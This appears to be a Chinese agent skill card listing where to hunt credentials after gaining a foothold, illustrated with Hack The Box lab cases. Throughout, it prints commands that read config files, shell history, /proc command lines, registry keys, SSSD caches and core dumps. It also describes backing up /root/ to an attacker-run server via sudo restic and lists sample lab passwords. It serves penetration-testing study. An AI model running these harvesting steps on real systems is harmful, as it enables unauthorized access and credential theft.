---
name: 'credential-hunting-locations'
description: '拿到 shell 却不知道往哪走、服务以服务账户运行、或发现了版本控制/备份/CI/注册表组件时,按「凭据载体」找下一组凭据的上游入口卡:配置文件与源码/Git 历史/命令历史与进程痕迹/应用日志/备份与快照/注册表/部署脚本/内存与 core dump。🆕 含「宽读数据源 → 无过滤秘密扫」固定动作（SIEM/构建期日志/process.command_line，含查询原语与阳性对照纪律）。（检索词：credential/credentials/password-hunting/凭据/口令/loot/config/web.config/.bash_history/git-history/reg-query/registry/restic/pspy/strings/core-dump/凭据来源/凭据载体/password hunting/git history/reg query/core dump/locations/部署日志/构建日志/deployment log/build log/SIEM/Kibana/Elastic/process.command_line/无过滤/unfiltered/秘密扫/secret scan/查询原语/primitive/match_phrase/query_string/wildcard/阳性对照）'
whenToUse: '拿到立足点或任意文件读之后,需要从目标自身找出下一组凭据时加载;拿到 hash 后转 password-attacks,拿到明文后转 credential-spraying-password-reuse'
metadata: { domain: creds, tier: T1 }
---

# 凭据来源枚举:拿到立足点后去哪里找凭据

> 来自 Insane 官方 WP 逐台回核,**23 台命中**:Brainfuck / Zero / Bookworm / Fingerprint / Cobblestone / Fulcrum / Dyplesher / Corporate / Mischief / Toby / WhiteRabbit / Sink / RegistryTwo / Jail / Skyfall / Sorcery / Hathor / Sekhmet / DarkCorp / BigHead / PivotAPI / Infiltrator / Hackback。

> 🔑 **总原则:先问「谁会记录它」,再问「它还在不在」。**
> 文件被删 ≠ 记录被删。注册表 MRU、应用日志、`git log --all`、云对象存储的旧版本、SSSD 缓存,都比文件本体更耐删。找不到文件时不要停,去找**记录这件事的那个东西**。

## 触发信号

- 拿到 shell 或任意文件读,但翻完家目录除了 `user.txt` 没有任何线索
- 目标跑着**服务账户**身份的服务(`www-data`/`nginx`/`svc_*`),而它的配置是别人写的
- 发现 `.git/`、自建 Git(Gogs/Gitea/GitLab)、`restic`/`mc`/`rclone`/Vault/Jenkins 一类组件
- 应用日志目录、审计目录、`temp.command_log` 这类表或文件可读
- Windows:`Get-Service` 里服务的 `PathName` 带参数;注册表服务键下出现大写 `Password`
- 能读 `/proc/<pid>/cmdline`,或能跑 `pspy` 守着看定时任务
- 存在 `.bash_history`、`.git-credentials`、`wp-config.php`、`web.config`、`sssd.conf`、`CustomSettings.ini`、`.env`
- 目标上有 X11 帧缓冲(`/xorg/xvfb/Xvfb_screen0`)、core dump、`.dmp`
- 上一组凭据在某服务失效却在另一服务有效 —— 说明还有第二处记录

## 前置验证

```bash
# 1. 我在哪、能读什么
id; hostname; sudo -l 2>/dev/null
find / -writable -type d 2>/dev/null | head

# 2. 有没有「记录者」在跑(定时任务/备份/配置管理)
ps aux | grep -Ei 'git|backup|restic|rsync|ansible|jenkins|vault|mc |aws|sshpass'
crontab -l 2>/dev/null; ls -la /etc/cron.* 2>/dev/null
systemctl list-timers --all 2>/dev/null | head -20

# 3. Windows:先看服务与注册表,再翻文件
Get-Service | Select Name,StartName,PathName
reg query HKLM /f Password /t REG_SZ /s
```

## 模式 1: 配置文件与源码(含后台页面源码)

条件:能读文件(LFI/容器/镜像/备份)或能进管理后台。**这是命中率最高的载体。**

```bash
# 后台"设置/关于"页面的 HTML 源码 —— 凭据常常直接印在里面
curl -s 'http://brainfuck.htb/wp-admin/options-general.php?page=easy-wp-smtp' | grep -iE 'smtp|user|pass'
# 按载体搜,不要只搜 password
grep -rInE 'password|passwd|authtok|secret|token|api[_-]?key|machineKey' /var/www /etc/sssd /usr/local 2>/dev/null
# LFI 回包是 zip 时:先 unzip 再 strings
unzip -o out.zip && strings Unknown.pdf | head
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Brainfuck | WP 后台 `Settings > Easy WP SMTP` 页面**源码**里直接是 `orestis:kHGuERB29DNiNE`,全程没碰数据库 |
| Zero | `/var/www/html/stats.php` 硬编码 `new mysqli("localhost","zroadmin","correct-horse-battery-staple","zro")` → 直接 `ssh zroadmin@zero.vl` |
| Bookworm | LFI 读 `../../../../../../../var/www/bookworm/database.js` → `bookworm:FrankTh3JobGiver` |
| Cobblestone | `LOAD_FILE`+`TO_BASE64`(配 `REPLACE(...,0x0a,'')` 去折行)读 `/var/www/html/db/connection.php` → `dbuser:aichooDeeYanaekungei9rogi0eMuo2o` |
| Fulcrum | `C:\Inetpub\wwwroot\web.config` 的 LDAP 连接串 → 查域控得文件服务器账号 `btables` 的另一组凭据 |
| Hackback | 部署目录里留着 `web.config.old` → `userName="simple" password="<REDACTED>"`(旧配置备份比现役配置更容易被漏掉) |
| RegistryTwo | `docker cp registrytwo:/usr/local/tomcat/webapps/hosting.war .` + `jd-gui` 反编译出 JDBC 串与 `/reconfigure` 改配置路径 |
| Corporate | `/etc/sssd/sssd.conf` 的 `ldap_default_bind_dn = cn=autobind,dc=corporate,dc=htb` 与 `ldap_default_authtok = ALo5u1njam14j1r8451amt5T` |
| Fingerprint | `app.war` 里 `HibernateUtil.class` 明文 `<REDACTED>` —— 它同时是 SSH 私钥的 passphrase |

🔴 后台**设置页/关于页**与数据库同等重要;`web.config` 这类部署配置是凭据金矿。

## 模式 2: 版本控制历史

条件:有 `.git/`、自建 Git 服务,或 release 里给了 `.bundle`/`repo.zip`。**被删掉的文件仍在历史里。**

```bash
git log --all --oneline
git log --all --diff-filter=D --name-only     # 先只看"被删除"的文件,缩范围
git log --all -p | grep -iE 'password|secret|key|token'
git show <commit>                              # 直接看某个可疑 commit
# bundle / 归档仓库
git clone 4e.bundle 4e && cd 4e && grep -rIi password .
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Sink | 归档仓库的 commit **diff** 里有 `marcus` 误提交的 `.keys` 目录与 SSH 私钥 |
| Corporate | `ourpeople` 仓库 commit `e1a0cf34753240d6dda0d42490f2733f260fe90b` 里是 `JWT_SECRET = <REDACTED>` |
| Dyplesher | Gogs release 的 `repo.zip` 解出 4 个 `.bundle`,`git clone <hash>.bundle` 还原后 grep 出 `walrus`,再用仓库里的 `users.db`(SQLite)继续爆 |
| RegistryTwo | 泄漏目录里 `_root_.git-credentials` = `https://admin:<REDACTED>@github.com` —— 该密码**直接就是 root 密码** |

🔴 `git log -p` 输出极长,先用 `--name-only`/`--diff-filter=D` 定位再展开。

## 模式 3: 命令历史与进程痕迹

条件:口令曾被写在命令行上(几乎总是),或目标有定时任务在跑高权限短命令。

```bash
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
# /proc 侧:完整命令行(含 -p 密码、-i 私钥路径)
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | tr -s ' ' | grep -iE 'pass|key|token|scp|ssh'
# 守着看:短命令跑完就没了
./pspy64 -f        # /proc 挂 hidepid=2 时用 -f 看文件系统事件
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Mischief | `.bash_history` 里口令被写在命令行上 → `lokipasswordmischieftrickery`,直接 `su` |
| Toby | `pspy` 看到 `scp -i /tmp/tmp.LK4Of6slcI/key ... jack@172.69.0.1:/home/jack/backups/` → `cat /tmp/*/key` 回收"转瞬即逝的 root 私钥" |
| Laser | `sshpass -p <pass>` 只把 `argv` 里的密码用 `z` 覆盖,存在极窄竞态窗口;`pspy64s` 先看到 root 用 `sshpass -p <pass> scp` |
| WhiteRabbit | `temp.command_log` 的 `command` 列直接给出 `restic init --repo rest:http://75951e6ff.whiterabbit.htb` 与 `echo <REDACTED> > .restic_passwd` |
| Fingerprint | 登录尝试写进 `auth.log`,而 `auth.log` 可经 80 端口 `/admin/view/auth.log` 读 |

🔴 WhiteRabbit 的同一行日志里还有 `rm -rf .bash_history` —— 运维/攻击者会删历史,**但不会删那张记录历史的表**。这就是总原则的实证。

## 模式 4: 应用日志与审计产物

条件:应用或脚本会把"结果"写进日志(密码、hash、请求体、令牌)。

```bash
grep -rInE 'password|passwd|hash|secret|Authorization' /var/log /opt/*/logs 2>/dev/null | head -50
# 反过来找"往哪写"的脚本:开关名就是线索
grep -rn 'write_hash_to_logs\|Out-File\|Add-Content\|>>' /opt /usr/local 2>/dev/null
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Hathor | `C:\get-bADPasswords` 的脚本开了 `write_hash_to_logs`,日志里直接是 `BeatriceMill` 的 NT hash `<REDACTED>` |
| Sink | LocalStack `cloudtrail` 日志组经 `awslocal logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222` 读出 `RotateSecret`/`RestoreSecret` 痕迹 → 定位 `secretsmanager` 的 `Jira Support` |
| Infiltrator | 用 `API-KEY` 调 `/api/chatrooms/logs` 得 `O.martinez` 明文密码;内部 IM 的群聊与日志是凭据富矿 |
| Fingerprint | `auth.log` 同时是 XSS 的回显通道与审计记录 |

## 模式 4.5: 🔴 宽读数据源 → 先做一次「无过滤的秘密扫」（固定 5 分钟动作）

条件:**拿到任何"能读一大片"的数据源** —— SIEM / 日志平台(Kibana、Splunk、ES) / 构建与部署日志 /
`process.command_line` 类遥测 / 备份仓库 / 代码仓全量。**不要求先知道里面有什么。**

🔴 **本模式与模式 4 的区别:模式 4 是"按应用找日志",本模式是"拿到宽读源后的固定动作"。**

```
[ ] ① 先做一次**不加任何主机/时间/用户过滤**的扫描 —— 覆盖**完整保留期**
[ ] ② 用"凭据形态"模式而不是"password"一个词:
      net  user · net1  user · -AsPlainText · ConvertTo-SecureString · password= · -p <值>
      cmdkey · sp_addlinkedsrvlogin · *Passw* · *pwd* · Authorization · API-KEY · authtok
      ⚠️ 注意**双空格**（"net  user"）—— 构建脚本里就是这样写的，单空格会漏
[ ] ③ 过滤只在**拿到全量之后**加（先全量、后筛主机），顺序反了就会漏
[ ] ④ 换原语复测（见下）
```

🔴 **原语纪律（本模式最容易死在这里）**：字段类型决定哪种查询能用。
`process.command_line` 在 Elastic 映射里是 **wildcard** 类型 ⇒ `match_phrase` 对它**恒返回 0**。
**"0 命中"必须先用阳性对照证明查询本身可用**（拿一个必然命中的样本跑同一原语），否则那 0 是个假否证。

```bash
# ❌ 恒 0 命中（wildcard 字段 + match_phrase）
{"query":{"match_phrase":{"process.command_line":"net user"}}}
# ✅ 换原语
{"query":{"query_string":{"query":"\"net  user\"","analyze_wildcard":true}}}
# ✅ 或干脆拉全量到本地再 grep（但要**不加主机过滤**）
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Ifrit (Pro Lab) | 🔴 **构建期/部署期日志是最高价值凭据源**:`process.command_line` 里有**全部 9 台机器的管理员明文口令**（`net user administrator <口令> /domain`）。代价对比:用了 `match_phrase` ⇒ 记成"查过 net user，无果"⇒ **2.5 小时可达窗口**;换 `query_string` ⇒ **一条命中**，后半场 6 面旗 21 分钟连拿。 |

> 🔴 教训一句话:**"查过 X，无果"必须标查询姿势**;而且**部署/构建期**的日志比运行期更值钱 ——
> 那时口令正被明文敲进命令行。

## 模式 5: 备份与快照

条件:目标上有 restic/mc/rclone/云对象存储,或能读备份目录。**覆盖 ≠ 安全,旧版本还在。**

```bash
# 对象存储:列出并取回旧版本
./mc version info <bucket>/<path>
./mc ls --versions <bucket>/<path>
./mc cp --version-id <id> <bucket>/<path> buckets/
# restic 仓库
restic snapshots -r <repo>; restic restore <snap> --target restored
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Skyfall | `mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 ...` 取回 v2 的 `home_backup.tar.gz`,解包后 `.bashrc` 比当前版多出 `export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-..."` |
| WhiteRabbit | 从日志拿到仓库地址与口令 → `restic restore 272cacd5` 得 `/dev/shm/bob/ssh/bob.7z` → `7z2john`+`john` 破 `1q2w3e4r5t6y` |
| Jail | `/var/adm/.keys` 里是加密 RAR + 口令格式说明,按"姓氏首字母大写+4 位出生年份+特殊字符"生成定向字典破出 |
| Corporate | 备份的 `~/.mozilla`(`object_data.data` 里的 `pinProtected.encrypted`)→ PIN `0239` → Gitea 密码与 TOTP |

🔴 备份工具是**双向**的:WhiteRabbit 里 `sudo -l` 给出 `(ALL) NOPASSWD: /usr/bin/restic`,于是 `sudo restic backup /root/` 到攻击者自建的 `rest-server` —— **备份即任意文件读取**。

## 模式 6: 注册表(Windows)

条件:有 Windows 本地权限或远程注册表读权限;服务/软件把凭据写进了键值。

```powershell
reg query HKLM /f Password /t REG_SZ /s
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f Password
Get-Service | Select Name,StartName,PathName
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select PSChildName,ImagePath
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| BigHead | JAWS 枚举发现 Bitvise SSH;`reg query HKLM /f Password /t REG_SZ /s` 在 nginx 服务键解出 hex 密码 → `chisel` 转发 `R:127.0.0.1:2020:127.0.0.1:2222` → `ssh nginx@127.0.0.1 -p 2222` |
| PivotAPI | 先 `ProcMon` 抓 `RestartOracle-Service.exe` 落地的临时 bat,删掉 `del` 语句提出 base64 还原内层 exe;`x64dbg` 在 banner 处 dump 内存段 `strings` 得 `#oracle_s3rV1c3!2010` |
| Hathor | AppLocker 审计走不通时凭据改从脚本日志来(见模式 4),说明"注册表没有"不等于"没有凭据" |

🔴 `reg query /s` 全盘搜会刷屏,先限定到 `HKLM\SYSTEM\CurrentControlSet\Services` 再放宽。
🆕 Windows 应用级 MRU(`RecentDocs`/`TypedPaths`/7-Zip `FolderHistory`)是"文件被谁打开过"的答案源,见 `windows-app-mru-forensics`。

## 模式 7: 部署脚本与自动化(netlogon / Ansible / CI)

条件:域环境有 `netlogon`/`SYSVOL`,或目标上有 Ansible/CI/配置管理。

```bash
# 拿到任一域账号后挂载域共享
net use \\dc.fulcrum.local\netlogon /user:fulcrum\btables ++FileServerLogon12345++
# 逐个脚本批量筛,不要手工翻
grep -rInE 'password|credential|ConvertTo-SecureString|authtok' /mnt/netlogon | head -50
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Fulcrum | `\\dc.fulcrum.local\netlogon` 下大量脚本,用 PowerShell 批量筛出域管凭据。原文结论:"候选凭据数量大到无法手工尝试时,自动化枚举是唯一出路" |
| PivotAPI | `NETLOGON` 共享里的程序 → 逆向出服务账密 |
| University | `db-backup-automator.ps1` 泄密码 `WebAO1337` |
| Toby | 私有仓库 `supportsystem-db`/`personal-webapp` 的部署代码即凭据源(Flask 源码 + `# removed creds and placed in environment` 注释反推出时间戳种子口令) |

🔴 部署脚本里的口令可能是 `ConvertTo-SecureString` 密文(需 DPAPI/机器密钥)——先判断明文还是密文,别硬解。

## 模式 8: 内存与核心转储

条件:能读 core dump、能 dump 进程内存、或目标有 X11 帧缓冲。

```bash
strings core | grep -iE 'password|secret|key|BEGIN'
xwdtopnm Xvfb_screen0 > capture.ppm          # X11 帧缓冲 → 截图读屏
sudo -u rebecca_smith /usr/bin/strace -s 128 -p <pid>   # 直接看进程写出的明文
strings /var/lib/sss/db/cache_<domain>.ldb   # SSSD 缓存
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| PivotAPI | `x64dbg` dump 内存段 `strings` 得 `#oracle_s3rV1c3!2010`,`de4Dot`+`dnSpy` 确认 `svc_oracle` 硬编码;并推理出迁移版 `svc_mssql` 的同构口令 `#mssql_s3rV1c3!2020`,同密码登 MSSQL sa |
| Sorcery | 取回 `/xorg/xvfb/Xvfb_screen0` 后 `xwdtopnm` 还原屏幕读出密码;`strace -s 128 -p <pid>` 抓到 `write(33, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 54)` |
| Response | core dump 里用"解密结果必须满足明文结构(TLV 长度 < 包长)"的约束筛出 32 字节 AES key |
| Sekhmet | `sssd.conf` 的 `cache_credentials=True`;`strings /var/lib/sss/db/cache_windcorp.htb.ldb` 提出 `Ray.Duncan@windcorp.htb` 的 `$6$` 哈希 → john |
| DarkCorp | 同法读 `/var/lib/sss/db/cache_darkcorp.htb.ldb` → john 得 `taylor.b.adm:<REDACTED>` |

🆕 Windows 侧对应物是 `.dmp`/`procdump` 出的内存段 + `de4Dot`/`dnSpy` 还原 .NET 硬编码凭据。

## 快速检查清单

```bash
[ ] 后台"设置/关于"页面源码 grep 过 smtp|password|key?
[ ] wp-config.php / web.config / sssd.conf / .env / CustomSettings.ini 读过?
[ ] .git 存在? git log --all --diff-filter=D --name-only 看过?
[ ] 自建 Git(Gogs/Gitea)的归档仓库与 release 附件翻过?
[ ] .bash_history / /proc/*/cmdline / pspy 看过命令行里的口令?
[ ] 🔴 拿到宽读数据源（SIEM/日志平台/构建日志/备份仓库）后，做过一次**无过滤 + 全保留期 + 凭据形态**的秘密扫?
[ ] 🔴 那次扫的"0 命中"用**阳性对照**证明过查询原语可用（字段类型是 text 还是 wildcard）?
[ ] 应用日志与"写日志的脚本"看过(write_hash_to_logs 这类开关)?
[ ] 对象存储 mc ls --versions / restic snapshots 试过?
[ ] Windows: reg query HKLM /f Password /t REG_SZ /s 跑过?
[ ] netlogon / SYSVOL / Ansible / CI 变量看过?
[ ] core dump / Xvfb 帧缓冲 / strace / .dmp 看过?
[ ] 拿到任何一组凭据后,先横向在所有服务上试一遍?
```

## 教训

1. **凭据几乎从不在"明显的位置"** —— 它在你不会主动去看的那一层:后台设置页的 HTML、commit diff、日志、注册表服务键。
2. **先问「谁会记录它」,再问「它还在不在」** —— 文件被删不等于记录被删。WhiteRabbit 的 `rm -rf .bash_history` 旁边就是一张完整记录着 restic 仓库口令的 `command_log` 表。
3. **服务账户是最大的线索** —— 看到 `svc_*`/`www-data`/`nginx` 在跑,就问"它的配置是谁写的、写在哪"。
4. **任何一组凭据都要先横向试** —— `.git-credentials` 里的 GitHub 密码直接就是 root 密码(RegistryTwo);`sssd.conf` 的 authtok 直接能 ldapsearch(Corporate)。
5. 🔴 **别只搜 `password` 这个词** —— 真实语料里它叫 `authtok`、`SECRET_KEY`、`JWT_SECRET`、`machineKey`、`VAULT_TOKEN`、`pinProtected.encrypted`。**按载体搜,不要按词搜。**

## 相关卡

- `password-attacks` —— 拿到 hash 之后(注册表 hex、SSSD `$6$`、NT hash、bcrypt、`.kdbx`)怎么识别与破解
- `credential-spraying-password-reuse` —— 拿到明文或疑似凭据后,横向在所有服务上验证/喷洒的强制流程
- `enumeration-command-layer` —— 还没拿到 shell 时,先做外部/内部枚举定位载体
- `windows-app-mru-forensics` —— 载体是 Windows 注册表 MRU 时,回答"文件被谁打开过/压缩包里有什么"
- `linux-privesc` / `windows-privesc` —— 凭据没找到时,改走提权面换取更高读权限
- `sherlock-investigation` —— 离线取证场景(只有磁盘/内存镜像,没有活体)
